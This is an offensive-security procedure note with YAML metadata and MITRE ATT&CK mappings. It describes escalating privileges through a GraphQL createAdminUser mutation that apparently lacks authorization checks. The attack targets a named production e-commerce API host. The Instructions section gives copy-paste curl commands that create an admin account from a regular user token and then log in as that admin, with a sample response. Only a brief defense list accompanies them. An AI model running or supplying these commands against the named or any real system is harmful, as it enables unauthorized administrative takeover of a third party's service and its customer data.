---
tags:
  - graphql
  - privilege-escalation
  - admin-creation
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/graphql-create-admin]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Local Account]]'
updated_at: '2025-12-14T17:25:59.692Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Local Account]]'
id: d44f2f9a-2540-4a00-93ee-808bef3aa4bf
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Local Account]]'
---
# Create-Admin-User-via-Mutation

## Summary

This procedure exploits insufficient authorization in the GraphQL CreateAdminUser mutation to escalate privileges by creating an admin account from a regular authenticated session.

## Description

With an active user token, the mutation at https://tng-api.watsons.com.my allows any authenticated user to invoke CreateAdminUser without role checks, directly assigning admin privileges. This bypasses standard auth flows, enabling control over sensitive operations in the e-commerce backend.

## Requirements

1. Authentication token from regular user registration
2. Knowledge of CreateAdminUser mutation from introspection
3. HTTP client supporting headers

## Defense

Defensive measures and detection strategies:

- Implement role-based access control (RBAC) on mutations
- Audit and restrict admin creation to super-admins only
- Monitor for privilege changes in API logs

## Objectives

1. Create elevated admin account
2. Bypass authorization checks
3. Gain persistent high-privilege access

## Instructions

### Step 1: Invoke CreateAdminUser Mutation

**Context**: Use the regular token to submit admin details.

**Command** ([[commands/graphql-create-admin]]):
```bash
curl -X POST https://tng-api.watsons.com.my/graphql -H "Content-Type: application/json" -H "Authorization: Bearer YOUR_REGULAR_TOKEN" -d '{"query": "mutation { createAdminUser(input: {email: \"admin@example.com\", password: \"adminpass123\"}) { user { id email role } } }"}'
```

> Response: {"data":{"createAdminUser":{"user":{"id":"456","email":"admin@example.com","role":"admin"}}}}

### Step 2: Authenticate as Admin

**Context**: Register/login with new admin credentials to get admin token.

**Command** ([[commands/graphql-create-admin]]):
```bash
curl -X POST https://tng-api.watsons.com.my/graphql -H "Content-Type: application/json" -d '{"query": "mutation { login(input: {email: \"admin@example.com\", password: \"adminpass123\"}) { token } }"}'
```

> Obtain admin token for privileged actions.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Valid Accounts]]
- [[Create Account]]

### Sub-Techniques

- [[Local Account]]

## Commands Used

- [[commands/graphql-create-admin]]

## Tools Used

- None

## Tags

- [[graphql]]
- [[privilege-escalation]]
- [[admin-creation]]
